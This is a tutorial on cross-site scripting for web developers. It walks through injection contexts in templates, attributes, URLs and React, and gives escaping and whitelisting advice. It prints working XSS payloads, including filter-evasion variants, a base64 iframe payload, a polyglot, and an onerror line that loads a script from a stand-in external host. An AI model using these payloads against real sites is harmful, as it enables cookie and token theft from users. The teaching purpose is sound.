```metadata
tags: web, security, xss
```

## web security: xss

`xss` is short for `cross site scripting`. It's very serious security bug that may
 affect all users of your website. Just think about attackers can run any malicious
 script at your website. They may stale user tokens, cookies to there server.

### short summaries
`xss` is not a small topic. Following is a short summaries:

-. be careful of EVERY user input
-. always use context aware template, avoid using those just doing string concatenating
-. escape user input (html escape, javascript escape); you should escape when they'll be
 used but not when received from user (as late as possible)
-. prefer whitelist to blacklist. limit trusted html tag, tag attributes, trusted url prefix.
 You may think of using regex to filter out dangerous content like `javascript`, `script`,
 `eval` and others. But NEVER do this. There are too many tips to escape these kinds of
 regex match.

### a simple xss example
`xss` mostly came from user inputs like username, blog contents, comments and uploaded
 images. Developers often put it in html template like:

    <div>name: {{ name }}</div>

Or injected html using `innerHTML` like following javascript code (frontend):

    document.querySelector('#content').innerHTML = name;

It won't have any problem if they are common content like `David`, `this is a title`.
But what if the attacker builds a special name like `<img src=x onerror='javascript:alert(1);'`?

Then the javascript is executed. Actually attacker can execute any other valid javascript
 code. For example, load an external script:

    <img src=x onerror="s=document.createElement('script');s.src='http://xxx.com/external.js';document.body.appendChild(s);">


Following are common `xss` examples. I uses `alert` but it could be any other code.

### template html xss
It's common to write template like following:

    <div>article title is {{ title }}</div>

What about title is string like `</div><script>alter(1);</script><div>`?

### template js xss
Someone may inject variables to javscript of backend template like following:

```js
<script>
    const user_id = {{ uid }};
    const user_name = '{{ name }}';
</script>
```

What about `uid` is something like `1;alert(123)`? What about `name` is something like
 `'alert(123);`?

### templtae tag attributes
Some tags like `img` support function handlers like `onload`, `onerror` that can will
 execute javscript.

Suppose a template like

    <img src="{{ image_url }}">

What about image_url is something like `invalid_url" onerror="javascript:alert(1);`.
Then it becomes

    <img src="invalid_url" onerror="javascript:alert(1);">

### href/src xss
The `href` attribute supports not only url like `https://`, but also `javascript:xxx`
 and the data uri.

So for template like `<a href="{{ url }}">link</a>`. It can be injected if url is
 something like `javascript: alert(1)`.

Attention, you should not write code that tries to exclude url those begin with `javascript`.
 It is suggested to filter using whitelist that allows those start with `http://` or
 `https://`.

The reason is that prefixes like `jaVasCript:`, `j&#x41;vascript:`, `java&#x0D;script:`
 also work well. You can mix any html escape characters in it. And some special characters
 like `CR(0x0d)`, `LF(0x0a)` can be inserted at any place. So it's hard to check the prefix
 to exclude `javascript:`.

This injection also applies to `src` attribute of `<iframe>`. And the `src` of `iframe`
 also supports the data uri protocol so that following xss also works (the base64 encoded
 content is `script>alert('XSS')</script>`).

    <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">

With base64 encoding, it can avoid many keywords based xss checkers.

A lot of blogs said that you can inject `javascript:` via `src` of `img`. I think it is
 old story. Modern browsers don't allow this, including `svg` with `script` inside it.

### SPA XSS (react, vue)
Nowadays, SPA built by react or vue is very popular. These frameworks often use context
 aware template and they will handle escape automatically for us. There is less chances
 to inject XSS, but less chances doesn't mean no chance.

It's very common to fetch UGC contents via http api and then render them. Example

```js
const Post = ({ content }) => {
    return (<div dangerouslySetInnerHTML={{ __html: content }}></div>)
}
```

It's easy to inject using a content like `<img src=x onerror="javascript:alert(1)";`.

For this case, you may wonder that why not use `<script>XXX</script>` directly. Actually,
 it won't work. The `<script>` tag is parsed and executed when the DOM is initially parsed.
 Those generated after this stage won't be executed. But `<img>` can be loaded at any
 time. Thus why we preferred `<img>` tag to do xss.

And all href/src related injections also works for SPA and react.

And there is also a concealed case when you use user data as props, like following:

```js
const Post = ({ userInfo }) => {
    return (<div { ...userInfo }></div>)
}
```

The `userInfo` in above case is UGC content. So what about user generates it as
 `{ dangerouslySetInnerHTML: { __html: '<malicious html content>' } }`?

### test cases
We need test cases to test our applications. The referenced google xss blog gives a very
 nice test string: `>'>"><img src=x onerror=alert(0)>`.

#### xss polyglot payload
A polyglot payload can inject at many different contexts. Let's see following example:

    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle>/</titLe>/</teXtarEa>/</scRipt>/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3e

-. It can inject the href attribute. For this case, the `/*...*/` is comment and will be
 ignored. The first alert will effect.

-. The ** ' " \` ** followed by a `/*` will close the quote in tag attribute or js and start
 a comment. This comment will be closed by `*/` before the `oNcliCk`. So the first alert will
 effect too. This hits template like `<a style="{{ style }}">`.

-. The `</stYle>/</titLe>/</teXtarEa>/</scRipt>/--!>` will close `<style>`, `<title>`,
 `<textarea>`, `<script>` and `<!--`. So that the second alert will work.

In above case, we found that it mixes upper case characters and lower case characters, like
 `jaVasCript`. It also use `\x3c` which is hex encode of `<`. By this way, it can evade those
 css checkers that simply do some string matchings but not context aware handling.

You can see details about this polyglot xss at
 [HackVault Wiki](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot).

### prevent xss
We need to check and escape user inputs to prevent xss. You should use different escape
 according to different context.

#### html escape
We can do html escape avoid html injection. You can replace those dangerous characters to
 html entities. Like

    <         to          &lt;
    >         to          &gt;
    "         to          &quot;    OR   &#34;
    '         to          &#39;
    &         to          &amp;

By this way, these characters will be parsed and displayed as normal text characters.

#### js escape
You need to do js escape in javascript context. For js code like `const user_name = "{{ name }}";`.
 The quote will be closed unexpectedly if name contains `"`. And then xss ejection happens.

To avoid this, we can escape characters like ** " ' \` \\ / ** to avoid this. Like replace
 `"` with `\U0022`.

Since javascript is contained in html context. You still needs to do html escape after
 js escape.

### xss resources
Google has a very interesting game-like site that you can try to practice XSS to
 improve knowledge about XSS. Try it at [google XSS game](https://xss-game.appspot.com/).

You really should have a look at
 [OWASP XSS filter evasion cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).
 It provides many nice xss tests.

### references
-. [google application security: xss](https://www.google.com/about/appsecurity/learning/xss/index.html)
-. [OWASP: XSS prevention cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-. [OWASP: XSS filter cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
-. [github HackVault: xss polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
